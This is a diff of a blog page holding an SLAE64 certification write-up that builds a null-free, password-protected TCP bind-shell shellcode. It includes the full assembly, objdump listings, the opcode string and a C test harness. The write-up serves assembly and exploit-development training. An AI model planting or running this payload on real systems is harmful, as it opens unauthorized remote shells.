@@ -104,8 +104,8 @@ Binds to a port; User needs to provide a correct password Executing a shell on i
   "keywords": [
     "slae64"
   ],
-  "articleBody": " This post introduces the first mission to my SLAE64 journey.\nIntroduction The main goal for the first SLAE64 assignment is to develop a shellcode for bind TCP shell with the following requirements:\nBinds to a port; User needs to provide a correct password Executing a shell on incoming connection if password is correct; The shellcode should be null-free; Past, present and Future The exercises of SLAE64 are identical to the ones of SLAE32, so for the 64 bit version I will have a more simple approach. If you want to see more detailed explanations of some topic please check the SLAE32 related post as the principles and ideas are the same\nThe diff between 32 and 64 bit versions ",
-  "wordCount" : "119",
+  "articleBody": " This post introduces the first mission to my SLAE64 journey.\nIntroduction The main goal for the first SLAE64 assignment is to develop a shellcode for bind TCP shell with the following requirements:\nBinds to a port; User needs to provide a correct password Executing a shell on incoming connection if password is correct; The shellcode should be null-free; Past, present and Future The exercises of SLAE64 are identical to the ones of SLAE32, so for the 64 bit version I will have a more simple approach.\nIf you want to see more detailed explanations of some topic please check the SLAE32 related post as the principles and ideas are the same.\nThe diff between 32 and 64 bit versions With the increase of memory space in 64 bit ISA the main differences stick mainly to the extension of the general purpose registers to 64 bit in size. eax, ebx, rcx, etc becomes rax, rbx, rcx, etc. More info here.\nThe calling conventions approach had a major update. For the 64 bit we have the System V ABI, when we call a syscall the function arguments are first passed into defined order of registers shown below.\nsyscall param 1 param 2 param 3 param 4 param 5 param 6 rax rdi rsi rdx r8 r9 r10 Further values are passed on the stack in reverse order, as in cdecl. Syscall number should be placed in rax. Also the return value is stored in rax too.\nFor a x86_64 syscall refence you can use the file /usr/include/x86_64-linux-gnu/asm/uninstd_64.h\nCreating a TCP Bind Shellcode There are lof of overlap information with my post regarding the SLAE32 TCP Bind Shellcode. I advice you to take look at if haven’t done already. There are some important concepts and ideas to understand what and why the shellcode is doing.\nFor this assignment I took the TCP Bind Shellcode that was used during the course as a reference. The following is already changed to work with a custom password.\nThe chosen password is isolemnlyswearthatiamuptonogood. This a 31 byte size string but our buffer has 32 bytes in size because of the newline byte we we press enter key.\nWe can leverage the helper script revHex64.py to output the password bytes ready to use.\nAvailable at https://github.com/0xnibbles/slae_x86_64/blob/main/revHex64.py\nAdding the ask password part to the final shellcode, becomes as follows:\nglobal _start _start: jmp main ask_pass: db \"Tell me the passcode\", 0xa ; RIP relative addressing , 0xa = new line main: ; sock = socket(AF_INET, SOCK_STREAM, 0) ; AF_INET = 2 ; SOCK_STREAM = 1 ; syscall number 41 xor rax, rax add rax, 41 mov rdi, 2 mov rsi, 1 mov rdx, 0 syscall ; copy socket descriptor to rdi for future use mov rdi, rax ; server.sin_family = AF_INET ; server.sin_port = htons(PORT) ; server.sin_addr.s_addr = INADDR_ANY ; bzero(\u0026server.sin_zero, 8) xor rax, rax push rax mov dword [rsp-4], eax mov word [rsp-6], 0x5c11 mov word [rsp-8], 0x2 sub rsp, 8 ; bind(sock, (struct sockaddr *)\u0026server, sockaddr_len) ; syscall number 49 mov rax, 49 mov rsi, rsp mov rdx, 16 syscall ; listen(sock, MAX_CLIENTS) ; syscall number 50 mov rax, 50 mov rsi, 2 syscall ; new = accept(sock, (struct sockaddr *)\u0026client, \u0026sockaddr_len) ; syscall number 43 mov rax, 43 sub rsp, 16 mov rsi, rsp mov byte [rsp-1], 16 sub rsp, 1 mov rdx, rsp syscall ; store the client socket description mov r9, rax ; close parent mov rax, 3 syscall ; duplicate sockets ; dup2 (new, old) mov rdi, r9 mov rax, 33 mov rsi, 0 syscall mov rax, 33 mov rsi, 1 syscall mov rax, 33 mov rsi, 2 syscall ; ############ asking for password ------------------------------ password: ; sys_write ; rax : 1 - write syscall number ; rdi : unsigned int fd : 1 for stdout ; rsi : const char *buf : password buffer ; rdx : size_t count : password size xor rax, rax xor rdx, rdx ; or cqo?? inc rax mov rdi, rax lea rsi, [rel ask_pass] mov rdx, 21 syscall ; sys_read ; rdi : unsigned int fd : 0 for stdin ; rsi : char *buf : stack? ; rdx : size_t count : how big xor rdx, rdx xor rax, rax xor rdi, rdi ; rax is already zero mov rsi, rsp add rdx, 32 ;password size syscall mov rdi, rsp xor rsi, rsi push rsi mov rsi, 0x0a646f6f676f6e6f ; \\ndoogono --\u003e \\n - new line byte = 0x0a push rsi mov rsi, 0x7470756d61697461 ; tpumaita push rsi mov rsi, 0x6874726165777379 ; htraewsy push rsi mov rsi, 0x6c6e6d656c6f7369 ; lnmelosi push rsi mov rsi, rsp ; password buffer pointer xor rcx, rcx add rcx, 32 ; 31 bytes for password and 1 byte for newline char repe cmpsb jne password ; ###### ------------------------------------------ ; execve ; First NULL push xor rax, rax push rax ; push /bin//sh in reverse mov rbx, 0x68732f2f6e69622f push rbx ; store /bin//sh address in RDI mov rdi, rsp ; Second NULL push push rax ; set RDX mov rdx, rsp ; Push address of /bin//sh push rdi ; set RSI mov rsi, rsp ; Call the Execve syscall add rax, 59 syscall The shellcode had null bytes as shown below with objdump.\nobjdump -M intel -d shell-bind-password-with-nulls shell-bind-password-with-nulls: file format elf64-x86-64 Disassembly of section .text: 0000000000401000 \u003c_start\u003e: 401000:\teb 15 jmp 401017 0000000000401002 : 401002:\t54 push rsp 401003:\t65 6c gs ins BYTE PTR es:[rdi],dx 401005:\t6c ins BYTE PTR es:[rdi],dx 401006:\t20 6d 65 and BYTE PTR [rbp+0x65],ch 401009:\t20 74 68 65 and BYTE PTR [rax+rbp*2+0x65],dh 40100d:\t20 70 61 and BYTE PTR [rax+0x61],dh 401010:\t73 73 jae 401085 401012:\t63 6f 64 movsxd ebp,DWORD PTR [rdi+0x64] 401015:\t65 gs 401016:\t0a .byte 0xa 0000000000401017 : 401017:\t48 31 c0 xor rax,rax 40101a:\t48 83 c0 29 add rax,0x29 40101e:\tbf 02 00 00 00 mov edi,0x2 401023:\tbe 01 00 00 00 mov esi,0x1 401028:\tba 00 00 00 00 mov edx,0x0 40102d:\t0f 05 syscall 40102f:\t48 89 c7 mov rdi,rax 401032:\t48 31 c0 xor rax,rax 401035:\t50 push rax 401036:\t89 44 24 fc mov DWORD PTR [rsp-0x4],eax 40103a:\t66 c7 44 24 fa 11 5c mov WORD PTR [rsp-0x6],0x5c11 401041:\t66 c7 44 24 f8 02 00 mov WORD PTR [rsp-0x8],0x2 401048:\t48 83 ec 08 sub rsp,0x8 40104c:\tb8 31 00 00 00 mov eax,0x31 401051:\t48 89 e6 mov rsi,rsp 401054:\tba 10 00 00 00 mov edx,0x10 401059:\t0f 05 syscall 40105b:\tb8 32 00 00 00 mov eax,0x32 401060:\tbe 02 00 00 00 mov esi,0x2 401065:\t0f 05 syscall 401067:\tb8 2b 00 00 00 mov eax,0x2b 40106c:\t48 83 ec 10 sub rsp,0x10 401070:\t48 89 e6 mov rsi,rsp 401073:\tc6 44 24 ff 10 mov BYTE PTR [rsp-0x1],0x10 401078:\t48 83 ec 01 sub rsp,0x1 40107c:\t48 89 e2 mov rdx,rsp 40107f:\t0f 05 syscall 401081:\t49 89 c1 mov r9,rax 401084:\tb8 03 00 00 00 mov eax,0x3 401089:\t0f 05 syscall 40108b:\t4c 89 cf mov rdi,r9 40108e:\tb8 21 00 00 00 mov eax,0x21 401093:\tbe 00 00 00 00 mov esi,0x0 401098:\t0f 05 syscall 40109a:\tb8 21 00 00 00 mov eax,0x21 40109f:\tbe 01 00 00 00 mov esi,0x1 4010a4:\t0f 05 syscall 4010a6:\tb8 21 00 00 00 mov eax,0x21 4010ab:\tbe 02 00 00 00 mov esi,0x2 4010b0:\t0f 05 syscall 00000000004010b2 : 4010b2:\t48 31 c0 xor rax,rax 4010b5:\t48 31 d2 xor rdx,rdx 4010b8:\t48 ff c0 inc rax 4010bb:\t48 89 c7 mov rdi,rax 4010be:\t48 8d 35 3d ff ff ff lea rsi,[rip+0xffffffffffffff3d] # 401002 4010c5:\tba 15 00 00 00 mov edx,0x15 4010ca:\t0f 05 syscall 4010cc:\t48 31 d2 xor rdx,rdx 4010cf:\t48 31 c0 xor rax,rax 4010d2:\t48 31 ff xor rdi,rdi 4010d5:\t48 89 e6 mov rsi,rsp 4010d8:\t48 83 c2 20 add rdx,0x20 4010dc:\t0f 05 syscall 4010de:\t48 89 e7 mov rdi,rsp 4010e1:\t48 31 f6 xor rsi,rsi 4010e4:\t56 push rsi 4010e5:\t48 be 6f 6e 6f 67 6f movabs rsi,0x0a646f6f676f6e6f 4010ec:\t6f 6f 64 4010ef:\t56 push rsi 4010f0:\t48 be 61 74 69 61 6d movabs rsi,0x7470756d61697461 4010f7:\t75 70 74 4010fa:\t56 push rsi 4010fb:\t48 be 79 73 77 65 61 movabs rsi,0x6874726165777379 401102:\t72 74 68 401105:\t56 push rsi 401106:\t48 be 69 73 6f 6c 65 movabs rsi,0x6c6e6d656c6f7369 40110d:\t6d 6e 6c 401110:\t56 push rsi 401111:\t48 89 e6 mov rsi,rsp 401114:\t48 31 c9 xor rcx,rcx 401117:\t48 83 c1 20 add rcx,0x20 40111b:\tf3 a6 repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi] 40111d:\t75 93 jne 4010b2 40111f:\t48 31 c0 xor rax,rax 401122:\t50 push rax 401123:\t48 bb 2f 62 69 6e 2f movabs rbx,0x68732f2f6e69622f 40112a:\t2f 73 68 40112d:\t53 push rbx 40112e:\t48 89 e7 mov rdi,rsp 401131:\t50 push rax 401132:\t48 89 e2 mov rdx,rsp 401135:\t57 push rdi 401136:\t48 89 e6 mov rsi,rsp 401139:\t48 83 c0 3b add rax,0x3b 40113d:\t0f 05 syscall The first task was to remove those null bytes .\nNulls? Get out of here! A lot of the nulls are because of the use of a full register extension such as rax or eax when it only used a part of its bits. For example\n40109a:\tb8 21 00 00 00 mov eax,0x21 eax has 32 bits in size and when we move 0x21 we only need 1 byte (8 bits). The remaining bits are filled with nulls.\nLet’s refactor this code.\nglobal _start _start: jmp main ask_pass: db \"Tell me the passcode\", 0xa main: ; sock = socket(AF_INET, SOCK_STREAM, 0) ; AF_INET = 2 ; SOCK_STREAM = 1 ; syscall number 41 xor rdx, rdx mul rdx ; zeroes rax add al, 41 mov dil, 2 mov sil, 1 ;mov rdx, 0 syscall ; copy socket descriptor to rdi for future use mov rdi, rax ; server.sin_family = AF_INET ; server.sin_port = htons(PORT) ; server.sin_addr.s_addr = INADDR_ANY ; bzero(\u0026server.sin_zero, 8) xor rax, rax push rax mov dword [rsp-4], eax mov word [rsp-6], 0x5c11 mov byte [rsp-8], 0x2 sub rsp, 8 ; bind(sock, (struct sockaddr *)\u0026server, sockaddr_len) ; syscall number 49 mov al, 49 mov rsi, rsp mov dl, 16 syscall ; listen(sock, MAX_CLIENTS) ; syscall number 50 mov al, 50 mov sil, 2 syscall ; new = accept(sock, (struct sockaddr *)\u0026client, \u0026sockaddr_len) ; syscall number 43 mov al, 43 sub rsp, 16 mov rsi, rsp mov byte [rsp-1], 16 sub rsp, 1 mov rdx, rsp syscall ; store the client socket description mov r9, rax ; close parent mov al, 3 syscall ; duplicate sockets ; dup2 (new, old) mov rdi, r9 mov al, 33 xor rsi, rsi syscall mov al, 33 ;mov rsi, 1 inc rsi syscall mov al, 33 ;mov rsi, 2 inc rsi syscall ; ############ asking for password ------------------------------ password: ; sys_write ; rax : 1 - write syscall number ; rdi : unsigned int fd : 1 for stdout ; rsi : const char *buf : password buffer ; rdx : size_t count : password size xor rax, rax xor rdx, rdx ; or cqo?? inc rax mov rdi, rax lea rsi, [rel ask_pass] mov dl, 21 syscall ; sys_read ; rdi : unsigned int fd : 0 for stdin ; rsi : char *buf : stack? ; rdx : size_t count : how big xor rdx, rdx xor rax, rax xor rdi, rdi ; rax is already zero mov rsi, rsp add rdx, 32 ;password size syscall mov rdi, rsp xor rsi, rsi push rsi mov rsi, 0x0a646f6f676f6e6f ; \\ndoogono --\u003e \\n - new line byte = 0x0a push rsi mov rsi, 0x7470756d61697461 ; tpumaita push rsi mov rsi, 0x6874726165777379 ; htraewsy push rsi mov rsi, 0x6c6e6d656c6f7369 ; lnmelosi push rsi mov rsi, rsp ; password buffer pointer xor rcx, rcx add rcx, 32 ; 31 bytes for password and 1 byte for newline char repe cmpsb jne password ; ###### ------------------------------------------ ; execve ; First NULL push xor rax, rax push rax ; push /bin//sh in reverse mov rbx, 0x68732f2f6e69622f push rbx ; store /bin//sh address in RDI mov rdi, rsp ; Second NULL push push rax ; set RDX mov rdx, rsp ; Push address of /bin//sh push rdi ; set RSI mov rsi, rsp ; Call the Execve syscall add rax, 59 syscall shell-bind-password: file format elf64-x86-64 Disassembly of section .text: 0000000000401000 \u003c_start\u003e: 401000:\teb 15 jmp 401017 0000000000401002 : 401002:\t54 push rsp 401003:\t65 6c gs ins BYTE PTR es:[rdi],dx 401005:\t6c ins BYTE PTR es:[rdi],dx 401006:\t20 6d 65 and BYTE PTR [rbp+0x65],ch 401009:\t20 74 68 65 and BYTE PTR [rax+rbp*2+0x65],dh 40100d:\t20 70 61 and BYTE PTR [rax+0x61],dh 401010:\t73 73 jae 401085 401012:\t63 6f 64 movsxd ebp,DWORD PTR [rdi+0x64] 401015:\t65 gs 401016:\t0a .byte 0xa 0000000000401017 : 401017:\t48 31 d2 xor rdx,rdx 40101a:\t48 f7 e2 mul rdx 40101d:\t04 29 add al,0x29 40101f:\t40 b7 02 mov dil,0x2 401022:\t40 b6 01 mov sil,0x1 401025:\t0f 05 syscall 401027:\t48 89 c7 mov rdi,rax 40102a:\t48 31 c0 xor rax,rax 40102d:\t50 push rax 40102e:\t89 44 24 fc mov DWORD PTR [rsp-0x4],eax 401032:\t66 c7 44 24 fa 11 5c mov WORD PTR [rsp-0x6],0x5c11 401039:\tc6 44 24 f8 02 mov BYTE PTR [rsp-0x8],0x2 40103e:\t48 83 ec 08 sub rsp,0x8 401042:\tb0 31 mov al,0x31 401044:\t48 89 e6 mov rsi,rsp 401047:\tb2 10 mov dl,0x10 401049:\t0f 05 syscall 40104b:\tb0 32 mov al,0x32 40104d:\t40 b6 02 mov sil,0x2 401050:\t0f 05 syscall 401052:\tb0 2b mov al,0x2b 401054:\t48 83 ec 10 sub rsp,0x10 401058:\t48 89 e6 mov rsi,rsp 40105b:\tc6 44 24 ff 10 mov BYTE PTR [rsp-0x1],0x10 401060:\t48 83 ec 01 sub rsp,0x1 401064:\t48 89 e2 mov rdx,rsp 401067:\t0f 05 syscall 401069:\t49 89 c1 mov r9,rax 40106c:\tb0 03 mov al,0x3 40106e:\t0f 05 syscall 401070:\t4c 89 cf mov rdi,r9 401073:\tb0 21 mov al,0x21 401075:\t48 31 f6 xor rsi,rsi 401078:\t0f 05 syscall 40107a:\tb0 21 mov al,0x21 40107c:\t48 ff c6 inc rsi 40107f:\t0f 05 syscall 401081:\tb0 21 mov al,0x21 401083:\t48 ff c6 inc rsi 401086:\t0f 05 syscall 0000000000401088 : 401088:\t48 31 c0 xor rax,rax 40108b:\t48 31 d2 xor rdx,rdx 40108e:\t48 ff c0 inc rax 401091:\t48 89 c7 mov rdi,rax 401094:\t48 8d 35 67 ff ff ff lea rsi,[rip+0xffffffffffffff67] # 401002 40109b:\tb2 15 mov dl,0x15 40109d:\t0f 05 syscall 40109f:\t48 31 d2 xor rdx,rdx 4010a2:\t48 31 c0 xor rax,rax 4010a5:\t48 31 ff xor rdi,rdi 4010a8:\t48 89 e6 mov rsi,rsp 4010ab:\t48 83 c2 20 add rdx,0x20 4010af:\t0f 05 syscall 4010b1:\t48 89 e7 mov rdi,rsp 4010b4:\t48 31 f6 xor rsi,rsi 4010b7:\t56 push rsi 4010b8:\t48 be 6f 6e 6f 67 6f movabs rsi,0x0a646f6f676f6e6f 4010bf:\t6f 6f 64 4010c2:\t56 push rsi 4010c3:\t48 be 61 74 69 61 6d movabs rsi,0x7470756d61697461 4010ca:\t75 70 74 4010cd:\t56 push rsi 4010ce:\t48 be 79 73 77 65 61 movabs rsi,0x6874726165777379 4010d5:\t72 74 68 4010d8:\t56 push rsi 4010d9:\t48 be 69 73 6f 6c 65 movabs rsi,0x6c6e6d656c6f7369 4010e0:\t6d 6e 6c 4010e3:\t56 push rsi 4010e4:\t48 89 e6 mov rsi,rsp 4010e7:\t48 31 c9 xor rcx,rcx 4010ea:\t80 c1 20 add cl,0x20 4010ed:\tf3 a6 repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi] 4010ef:\t75 97 jne 401088 4010f1:\t48 31 c0 xor rax,rax 4010f4:\t50 push rax 4010f5:\t48 bb 2f 62 69 6e 2f movabs rbx,0x68732f2f6e69622f 4010fc:\t2f 73 68 4010ff:\t53 push rbx 401100:\t48 89 e7 mov rdi,rsp 401103:\t50 push rax 401104:\t48 89 e2 mov rdx,rsp 401107:\t57 push rdi 401108:\t48 89 e6 mov rsi,rsp 40110b:\t48 83 c0 3b add rax,0x3b 40110f:\t0f 05 syscall From the output we can verify the null bytes were gone effectively.\nCompiling and Testing the Shellcode To be easier to compile my shellcode scripts and get the size and the opcodes I’ll use the 64-bit version of assembler.sh.\nAvailable in https://github.com/0xnibbles/slae_x86_64/blob/main/assembler.sh\nChecking assembler.sh output\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/1-shell-bind-tcp-password-shellcode ‹main●› ╰─$ ../../assembler.sh shell-bind-password.nasm [*] Compiling with NASM [*] Linking [*] Extracting opcodes [*] Done Shellcode size: 273 \"\\xeb\\x15\\x54\\x65\\x6c\\x6c\\x20\\x6d\\x65\\x20\\x74\\x68\\x65\\x20\\x70\\x61\\x73\\x73\\x63\\x6f\\x64\\x65\\x0a\\x48\\x31\\xd2\\x48\\xf7\\xe2\\x04\\x29\\x40\\xb7\\x02\\x40\\xb6\\x01\\x0f\\x05\\x48\\x89\\xc7\\x48\\x31\\xc0\\x50\\x89\\x44\\x24\\xfc\\x66\\xc7\\x44\\x24\\xfa\\x11\\x5c\\xc6\\x44\\x24\\xf8\\x02\\x48\\x83\\xec\\x08\\xb0\\x31\\x48\\x89\\xe6\\xb2\\x10\\x0f\\x05\\xb0\\x32\\x40\\xb6\\x02\\x0f\\x05\\xb0\\x2b\\x48\\x83\\xec\\x10\\x48\\x89\\xe6\\xc6\\x44\\x24\\xff\\x10\\x48\\x83\\xec\\x01\\x48\\x89\\xe2\\x0f\\x05\\x49\\x89\\xc1\\xb0\\x03\\x0f\\x05\\x4c\\x89\\xcf\\xb0\\x21\\x48\\x31\\xf6\\x0f\\x05\\xb0\\x21\\x48\\xff\\xc6\\x0f\\x05\\xb0\\x21\\x48\\xff\\xc6\\x0f\\x05\\x48\\x31\\xc0\\x48\\x31\\xd2\\x48\\xff\\xc0\\x48\\x89\\xc7\\x48\\x8d\\x35\\x67\\xff\\xff\\xff\\xb2\\x15\\x0f\\x05\\x48\\x31\\xd2\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x89\\xe6\\x48\\x83\\xc2\\x20\\x0f\\x05\\x48\\x89\\xe7\\x48\\x31\\xf6\\x56\\x48\\xbe\\x6f\\x6e\\x6f\\x67\\x6f\\x6f\\x64\\x0a\\x56\\x48\\xbe\\x61\\x74\\x69\\x61\\x6d\\x75\\x70\\x74\\x56\\x48\\xbe\\x79\\x73\\x77\\x65\\x61\\x72\\x74\\x68\\x56\\x48\\xbe\\x69\\x73\\x6f\\x6c\\x65\\x6d\\x6e\\x6c\\x56\\x48\\x89\\xe6\\x48\\x31\\xc9\\x80\\xc1\\x20\\xf3\\xa6\\x75\\x97\\x48\\x31\\xc0\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6\\x48\\x83\\xc0\\x3b\\x0f\\x05\" -------------------- [*] Hack the World! -------------------- No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program\n#include #include unsigned char code[] = \\ \"\\xeb\\x15\\x54\\x65\\x6c\\x6c\\x20\\x6d\\x65\\x20\\x74\\x68\\x65\\x20\\x70\\x61\\x73\\x73\\x63\\x6f\\x64\\x65\\x0a\\x48\\x31\\xd2\\x48\\xf7\\xe2\\x04\\x29\\x40\\xb7\\x02\\x40\\xb6\\x01\\x0f\\x05\\x48\\x89\\xc7\\x48\\x31\\xc0\\x50\\x89\\x44\\x24\\xfc\\x66\\xc7\\x44\\x24\\xfa\\x11\\x5c\\xc6\\x44\\x24\\xf8\\x02\\x48\\x83\\xec\\x08\\xb0\\x31\\x48\\x89\\xe6\\xb2\\x10\\x0f\\x05\\xb0\\x32\\x40\\xb6\\x02\\x0f\\x05\\xb0\\x2b\\x48\\x83\\xec\\x10\\x48\\x89\\xe6\\xc6\\x44\\x24\\xff\\x10\\x48\\x83\\xec\\x01\\x48\\x89\\xe2\\x0f\\x05\\x49\\x89\\xc1\\xb0\\x03\\x0f\\x05\\x4c\\x89\\xcf\\xb0\\x21\\x48\\x31\\xf6\\x0f\\x05\\xb0\\x21\\x48\\xff\\xc6\\x0f\\x05\\xb0\\x21\\x48\\xff\\xc6\\x0f\\x05\\x48\\x31\\xc0\\x48\\x31\\xd2\\x48\\xff\\xc0\\x48\\x89\\xc7\\x48\\x8d\\x35\\x67\\xff\\xff\\xff\\xb2\\x15\\x0f\\x05\\x48\\x31\\xd2\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x89\\xe6\\x48\\x83\\xc2\\x20\\x0f\\x05\\x48\\x89\\xe7\\x48\\x31\\xf6\\x56\\x48\\xbe\\x6f\\x6e\\x6f\\x67\\x6f\\x6f\\x64\\x0a\\x56\\x48\\xbe\\x61\\x74\\x69\\x61\\x6d\\x75\\x70\\x74\\x56\\x48\\xbe\\x79\\x73\\x77\\x65\\x61\\x72\\x74\\x68\\x56\\x48\\xbe\\x69\\x73\\x6f\\x6c\\x65\\x6d\\x6e\\x6c\\x56\\x48\\x89\\xe6\\x48\\x31\\xc9\\x80\\xc1\\x20\\xf3\\xa6\\x75\\x97\\x48\\x31\\xc0\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6\\x48\\x83\\xc0\\x3b\\x0f\\x05\"; main() { printf(\"Shellcode Length: %d\\n\", strlen(code)); int (*ret)() = (int(*)())code; ret(); } Compiling with gcc and executing it\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/1-shell-bind-tcp-password-shellcode ‹main●› ╰─$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c shellcode.c:7:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ ╭─edu@debian ~/Desktop/slae_x86_64/assignments/1-shell-bind-tcp-password-shellcode ‹main●› ╰─$ ./shellcode Shellcode Length: 273 Tell me the passcode hsfjdfhgs Tell me the passcode isolemnlyswearthatiamuptonogood $ whoami edu $ Oh yeah! The shellcode checks correctly for the right password and spawns a shell!\nThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/\nStudent ID: PA-31319\nAll the source code files are available on GitHub at https://github.com/0xnibbles/slae_x86\n",
+  "wordCount" : "2858",
   "inLanguage": "en",
   "datePublished": "2022-12-30T18:54:45Z",
   "dateModified": "2022-12-30T18:54:45Z",
@@ -210,7 +210,7 @@ Binds to a port; User needs to provide a correct password Executing a shell on i
     <h1 class="post-title">
       SLAE64 Assignment 1 - TCP Bind Shellcode
     </h1>
-    <div class="post-meta"><span title='2022-12-30 18:54:45 +0000 UTC'>December 30, 2022</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;nibbles
+    <div class="post-meta"><span title='2022-12-30 18:54:45 +0000 UTC'>December 30, 2022</span>&nbsp;·&nbsp;14 min&nbsp;·&nbsp;nibbles
 
 </div>
   </header> <div class="toc">
@@ -225,8 +225,17 @@ Binds to a port; User needs to provide a correct password Executing a shell on i
                 <li>
                     <a href="#past-present-and-future" aria-label="Past, present and Future">Past, present and Future</a></li>
                 <li>
-                    <a href="#the-diff-between-32-and-64-bit-versions" aria-label="The diff between 32 and 64 bit versions">The diff between 32 and 64 bit versions</a>
+                    <a href="#the-diff-between-32-and-64-bit-versions" aria-label="The diff between 32 and 64 bit versions">The diff between 32 and 64 bit versions</a></li>
+                <li>
+                    <a href="#creating-a-tcp-bind-shellcode" aria-label="Creating a TCP Bind Shellcode">Creating a TCP Bind Shellcode</a><ul>
+                        
+                <li>
+                    <a href="#nulls-get-out-of-here" aria-label="Nulls? Get out of here!">Nulls? Get out of here!</a></li>
+                <li>
+                    <a href="#compiling-and-testing-the-shellcode" aria-label="Compiling and Testing the Shellcode">Compiling and Testing the Shellcode</a>
                 </li>
+            </ul>
+            </li>
             </ul>
         </div>
     </details>
@@ -244,8 +253,709 @@ Binds to a port; User needs to provide a correct password Executing a shell on i
 <li>The shellcode should be <strong>null-free</strong>;</li>
 </ul>
 <h2 id="past-present-and-future">Past, present and Future<a hidden class="anchor" aria-hidden="true" href="#past-present-and-future">#</a></h2>
-<p>The exercises of SLAE64 are identical to the ones of SLAE32, so for the 64 bit version I will have a more simple approach. If you want to see more detailed explanations of some topic please check the SLAE32 related post as the principles and ideas are the same</p>
+<p>The exercises of SLAE64 are identical to the ones of SLAE32, so for the 64 bit version I will have a more simple approach.</p>
+<p>If you want to see more detailed explanations of some topic please check the SLAE32 related post as the principles and ideas are the same.</p>
 <h2 id="the-diff-between-32-and-64-bit-versions">The diff between 32 and 64 bit versions<a hidden class="anchor" aria-hidden="true" href="#the-diff-between-32-and-64-bit-versions">#</a></h2>
+<p>With the increase of memory space in 64 bit ISA the main differences stick mainly to the extension of the general purpose registers to 64 bit in size. <code>eax</code>, <code>ebx</code>, <code>rcx</code>, etc becomes <code>rax</code>, <code>rbx</code>, <code>rcx</code>, etc. More info <a href="https://www.tortall.net/projects/yasm/manual/html/arch-x86-registers.html">here</a>.</p>
+<p>The calling conventions approach had a major update. For the 64 bit we have the <a href="https://wiki.osdev.org/System_V_ABI"><code>System V ABI</code></a>, when we call a syscall the function arguments are first passed into defined order of registers shown below.</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">syscall</th>
+<th style="text-align:center">param 1</th>
+<th style="text-align:center">param 2</th>
+<th style="text-align:center">param 3</th>
+<th style="text-align:center">param 4</th>
+<th style="text-align:center">param 5</th>
+<th style="text-align:center">param 6</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">rax</td>
+<td style="text-align:center">rdi</td>
+<td style="text-align:center">rsi</td>
+<td style="text-align:center">rdx</td>
+<td style="text-align:center">r8</td>
+<td style="text-align:center">r9</td>
+<td style="text-align:center">r10</td>
+</tr>
+</tbody>
+</table>
+<p>Further values are passed on the stack in reverse order, as in <code>cdecl</code>. Syscall number should be placed in <code>rax</code>. Also the return value is stored in <code>rax</code> too.</p>
+<p>For a x86_64 syscall refence you can use the file <code>/usr/include/x86_64-linux-gnu/asm/uninstd_64.h</code></p>
+<h2 id="creating-a-tcp-bind-shellcode">Creating a TCP Bind Shellcode<a hidden class="anchor" aria-hidden="true" href="#creating-a-tcp-bind-shellcode">#</a></h2>
+<p>There are lof of overlap information with my post regarding the <a href="/posts/slae_32_assignment_1/">SLAE32 TCP Bind Shellcode</a>. I advice you to take look at if haven&rsquo;t done already. There are some important concepts and ideas to understand what and why the shellcode is doing.</p>
+<p>For this assignment I took the TCP Bind Shellcode that was used during the course as a reference. The following is already changed to work with a custom password.</p>
+<p><img loading="lazy" src="/slae64/1/bind_pass.jpg#center" alt="Marauder&amp;rsquo;s Map Password"  title="Marauder&#39;s Map Password"  />
+</p>
+<p>The chosen password is <code>isolemnlyswearthatiamuptonogood</code>. This a 31 byte size string but our buffer has 32 bytes in size because of the <code>newline</code> byte we we press <code>enter</code> key.</p>
+<p>We can leverage the helper script <code>revHex64.py</code> to output the password bytes ready to use.</p>
+<p><img loading="lazy" src="/slae64/1/image.png#center" alt="revHex64.py"  title="revHex64.py"  />
+</p>
+<blockquote>
+<p>Available at <a href="https://github.com/0xnibbles/slae_x86_64/blob/main/revHex64.py">https://github.com/0xnibbles/slae_x86_64/blob/main/revHex64.py</a></p>
+</blockquote>
+<p>Adding the ask password part to the <code>final shellcode</code>, becomes as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">global</span> <span style="color:#66d9ef">_start</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>_start:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">main</span>
+</span></span><span style="display:flex;"><span>    ask_pass: <span style="color:#a6e22e">db</span> <span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#66d9ef">Tell</span> <span style="color:#66d9ef">me</span> <span style="color:#66d9ef">the</span> <span style="color:#66d9ef">passcode</span><span style="color:#960050;background-color:#1e0010">&#34;</span>, <span style="color:#ae81ff">0xa</span>  <span style="color:#75715e">; RIP relative addressing , 0xa = new line
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>main:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; sock = socket(AF_INET, SOCK_STREAM, 0)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">; AF_INET = 2
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">; SOCK_STREAM = 1
